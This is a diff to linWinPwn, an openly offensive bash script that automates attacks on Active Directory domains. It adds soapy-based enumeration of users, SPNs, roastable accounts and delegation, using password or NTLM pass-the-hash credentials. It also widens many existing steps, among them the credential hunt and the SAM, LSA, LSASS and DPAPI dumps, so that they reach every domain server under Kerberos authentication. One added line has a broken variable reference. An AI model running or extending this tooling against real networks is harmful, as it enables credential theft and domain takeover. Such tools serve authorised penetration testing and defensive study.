@@ -130,6 +130,7 @@ ldapnomnom="$scripts_dir/ldapnomnom"
 godap="$scripts_dir/godap"
 mssqlpwner=$(which mssqlpwner)
 aesKrbKeyGen="$scripts_dir/aesKrbKeyGen.py"
+soapy=$(which soapy)
 nmap=$(which nmap)
 john=$(which john)
 python3="${scripts_dir}/.venv/bin/python3"
@@ -143,7 +144,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.31 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.32 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -172,9 +173,9 @@ help_linWinPwn() {
     echo -e "--verbose           Enable all verbose and debug outputs"
     echo -e "-I/--interface      Attacker's network interface (default: eth0)"
     echo -e "-T/--targets        Target systems for Vuln Scan, SMB Scan and Pwd Dump (default: Domain Controllers)"
+    echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
     echo -e "-U/--userwordlist   Custom username list used during Null session checks"
     echo -e "-P/--passwordlist   Custom password list used during password cracking"
-    echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
     echo -e ""
     echo -e "${YELLOW}Example usages${NC}"
     echo -e "$(pwd)/$(basename "$0") -t dc_ip ${CYAN}(No password for anonymous login)${NC}" >&2
@@ -580,6 +581,7 @@ authenticate() {
         argument_evilwinrm="-u '${user}' -p '${password}'"
         argument_godap="-u '${user}'@${domain} -p '${password}'"
         argument_mssqlpwner="${domain}/'${user}':'${password}'"
+        argument_soapy="${domain}/'${user}':'${password}'"
         hash_bool=false
         kerb_bool=false
         unset KRB5CCNAME
@@ -648,6 +650,7 @@ authenticate() {
                 argument_evilwinrm="-u '${user}' -H ${hash:33}"
                 argument_godap="-u '${user}' -d ${domain} -H ${hash}"
                 argument_mssqlpwner="-hashes ${hash} ${domain}/'${user}'"
+                argument_soapy="--hash ${hash:33} ${domain}/'${user}'"
                 auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of '${user}'${NC}"
             else
                 echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
@@ -844,6 +847,7 @@ authenticate() {
         argument_privexchange="${argument_privexchange} --debug"
         argument_adcheck="${argument_adcheck} --debug"
         argument_mssqlpwner="-debug ${argument_mssqlpwner}"
+        argument_soapy="--debug ${argument_soapy}"
     fi
 
     echo -e "${auth_string}"
@@ -1650,6 +1654,30 @@ adcheck_enum() {
     echo -e ""
 }
 
+soapy_enum() {
+    if [ ! -f "${soapy}" ]; then
+        echo -e "${RED}[-] Please verify the installation of soapy${NC}"
+    else
+        mkdir -p "${output_dir}/DomainRecon/soapy"
+        echo -e "${BLUE}[*] soapy Enumeration${NC}"
+        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+            echo -e "${PURPLE}[-] soapy requires credentials and does not support Kerberos authentication${NC}"
+        else
+            cd "${output_dir}/DomainRecon/soapy" || exit
+            run_command "${soapy} --ts --users ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_users_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --computers ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_computers_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --groups ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_groups_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --constrained ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_constrained_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --unconstrained ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_unconstrained_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --spns ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_spns_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --asreproastable ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_asreproastable_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --admins ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_admins_output_${dc_domain}.txt"
+            run_command "${soapy} --ts --rbcds ${argument_soapy}@${dc_ip}" | tee "${output_dir}/DomainRecon/soapy/soapy_rbcds_output_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
 ###### adcs_enum: ADCS Enumeration
 ne_adcs_enum() {
     mkdir -p "${output_dir}/ADCS"
@@ -1936,10 +1964,6 @@ masky_dump() {
     else
         ne_adcs_enum
         if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
-            if [ "${kerb_bool}" == true ]; then
-                echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-                curr_targets="Domain Controllers"
-            fi
             smb_scan
             i=0
             for pki_server in $pki_servers; do
@@ -2440,10 +2464,6 @@ smb_map() {
 }
 
 ne_shares() {
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     echo -e "${BLUE}[*] Enumerating Shares using netexec ${NC}"
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --shares --log ${output_dir}/Shares/ne_shares_output_${dc_domain}.txt" 2>&1
@@ -2457,10 +2477,6 @@ ne_shares() {
 }
 
 ne_spider() {
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     echo -e "${BLUE}[*] Spidering Shares using netexec ${NC}"
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_output_${dc_domain}.txt" 2>&1
@@ -2572,10 +2588,6 @@ zerologon_check() {
 
 ms17-010_check() {
     echo -e "${BLUE}[*] MS17-010 check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ms17-010 --log ${output_dir}/Vulnerabilities/ne_ms17-010_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2583,10 +2595,6 @@ ms17-010_check() {
 
 coerceplus_check() {
     echo -e "${BLUE}[*] coerce check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M coerce_plus --log ${output_dir}/Vulnerabilities/ne_coerce_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2594,10 +2602,6 @@ coerceplus_check() {
 
 spooler_check() {
     echo -e "${BLUE}[*] Print Spooler check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spooler --log ${output_dir}/Vulnerabilities/ne_spooler_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2605,10 +2609,6 @@ spooler_check() {
 
 printnightmare_check() {
     echo -e "${BLUE}[*] Print Nightmare check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M printnightmare --log ${output_dir}/Vulnerabilities/ne_printnightmare_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2616,10 +2616,6 @@ printnightmare_check() {
 
 webdav_check() {
     echo -e "${BLUE}[*] WebDAV check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M webdav --log ${output_dir}/Vulnerabilities/ne_webdav_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2627,10 +2623,6 @@ webdav_check() {
 
 smbsigning_check() {
     echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --gen-relay-list ${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" 2>&1
     if [ ! -s "${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" ]; then
@@ -2641,10 +2633,6 @@ smbsigning_check() {
 
 ntlmv1_check() {
     echo -e "${BLUE}[*] ntlmv1 check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ntlmv1 --log ${output_dir}/Vulnerabilities/ne_ntlmv1_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2652,10 +2640,6 @@ ntlmv1_check() {
 
 smbghost_check() {
     echo -e "${BLUE}[*] smbghost check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M smbghost --log ${output_dir}/Vulnerabilities/ne_smbghost_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -2663,10 +2647,6 @@ smbghost_check() {
 
 runasppl_check() {
     echo -e "${BLUE}[*] runasppl check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M runasppl --log ${output_dir}/Vulnerabilities/ne_runasppl_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -3340,10 +3320,6 @@ add_spn_constrained() {
 ###### pwd_dump: Password Dump
 juicycreds_dump() {
     echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
     smb_scan
     for i in $(/bin/cat "${servers_smb_list}"); do
         echo -e "${CYAN}[*] Searching in ${i} ${NC}"
@@ -3444,10 +3420,6 @@ sam_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
     else
-        if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-            curr_targets="Domain Controllers"
-        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
@@ -3462,10 +3434,6 @@ lsa_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
     else
-        if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-            curr_targets="Domain Controllers"
-        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
@@ -3480,10 +3448,6 @@ lsassy_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-            curr_targets="Domain Controllers"
-        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
@@ -3498,10 +3462,6 @@ handlekatz_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-            curr_targets="Domain Controllers"
-        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
@@ -3516,10 +3476,6 @@ procdump_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-            curr_targets="Domain Controllers"
-        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
@@ -3534,10 +3490,6 @@ nanodump_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-            curr_targets="Domain Controllers"
-        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
@@ -3552,10 +3504,6 @@ dpapi_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] DPAPI dump requires credentials${NC}"
     else
-        if [ "${kerb_bool}" == true ]; then
-            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-            curr_targets="Domain Controllers"
-        fi
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}"
@@ -4028,6 +3976,7 @@ ad_menu() {
     echo -e "27) Run godap console"
     echo -e "28) Run adPEAS enumerations"
     echo -e "29) Run ADCheck enumerations"
+    echo -e "30) Run soapy enumerations"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4191,6 +4140,11 @@ ad_menu() {
 
     29)
         adcheck_enum
+        ad_menu
+        ;;
+
+    30)
+        soapy_enum
         ad_menu
         ;;
 
@@ -4688,7 +4642,7 @@ kerberos_menu() {
             echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:${NC}"
             read -rp ">> " rc4_or_aes </dev/tty
             while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
-                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':${NC}"
+                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
                 read -rp ">> " rc4_or_aes </dev/tty
             done
             gethash_user="krbtgt"
@@ -5776,7 +5730,8 @@ config_menu() {
         if [ ! -x "${ldapnomnom}" ]; then echo -e "${RED}[-] ldapnomnom is not executable${NC}"; else echo -e "${GREEN}[+] ldapnomnom is executable${NC}"; fi
         if [ ! -f "${godap}" ]; then echo -e "${RED}[-] godap is not installed${NC}"; else echo -e "${GREEN}[+] godap is installed${NC}"; fi
         if [ ! -x "${godap}" ]; then echo -e "${RED}[-] godap is not executable${NC}"; else echo -e "${GREEN}[+] godap is executable${NC}"; fi
-        if [ ! -f "${mssqlpwner }" ]; then echo -e "${RED}[-] mssqlpwner  is not installed${NC}"; else echo -e "${GREEN}[+] mssqlpwner  is installed${NC}"; fi
+        if [ ! -f "${mssqlpwner}" ]; then echo -e "${RED}[-] mssqlpwner  is not installed${NC}"; else echo -e "${GREEN}[+] mssqlpwner  is installed${NC}"; fi
+        if [ ! -f "${soapy }" ]; then echo -e "${RED}[-] soapy  is not installed${NC}"; else echo -e "${GREEN}[+] soapy  is installed${NC}"; fi
         config_menu
         ;;
 
